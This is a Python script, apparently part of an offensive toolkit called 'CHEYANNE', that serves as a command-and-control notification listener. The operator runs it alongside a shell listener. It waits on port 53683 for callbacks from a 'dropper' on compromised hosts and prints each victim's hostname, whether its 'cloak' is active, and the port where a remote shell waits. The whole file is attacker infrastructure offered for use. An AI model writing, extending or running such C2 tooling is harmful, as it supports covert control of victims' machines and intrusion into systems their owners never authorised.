"""
c2_listen.py — CHEYANNE C2 Notification Listener
22DIV / george wu

Listens for dropper callback notifications on port 53683.
Run this on the operator's machine alongside the C2 shell listener.

Usage:
    python c2_listen.py              # listen on 0.0.0.0:53683
    python c2_listen.py 53683        # explicit port
    python c2_listen.py 53683 eth0   # bind to specific interface
"""
import socket
import sys
import datetime

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 53683
BIND = sys.argv[2] if len(sys.argv) > 2 else "0.0.0.0"

GREEN  = "\033[92m"
RED    = "\033[91m"
AMBER  = "\033[93m"
DIM    = "\033[90m"
RST    = "\033[0m"
BOLD   = "\033[1m"

print(f"\n  {GREEN}{BOLD}CHEYANNE C2 NOTIFICATION LISTENER{RST}")
print(f"  {DIM}{'─' * 40}{RST}")
print(f"  {AMBER}Bind:{RST}  {BIND}:{PORT}")
print(f"  {DIM}Waiting for dropper callbacks...{RST}\n")

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind((BIND, PORT))
srv.listen(5)

try:
    while True:
        conn, addr = srv.accept()
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        try:
            data = conn.recv(1024).decode("utf-8", errors="replace").strip()
            parts = data.split("|")
            if len(parts) == 3:
                host, cloak_ok, port = parts[0], parts[1], parts[2]
                cloak_str = f"{GREEN}ACTIVE{RST}" if cloak_ok == "1" else f"{RED}FAILED{RST}"
                print(f"  {GREEN}[{ts}]{RST} {BOLD}CALLBACK{RST} from {addr[0]}:{addr[1]}")
                print(f"          Host: {BOLD}{host}{RST}")
                print(f"          Cloak: {cloak_str}")
                print(f"          Shell: port {port}\n")
            else:
                print(f"  {GREEN}[{ts}]{RST} {BOLD}{addr[0]}:{addr[1]}{RST}")
                print(f"          {DIM}{data}{RST}\n")
        except Exception:
            print(f"  {RED}[{ts}]{RST} {addr[0]}:{addr[1]} — recv error\n")
        finally:
            conn.close()
except KeyboardInterrupt:
    print(f"\n  {DIM}Listener stopped.{RST}\n")
finally:
    srv.close()
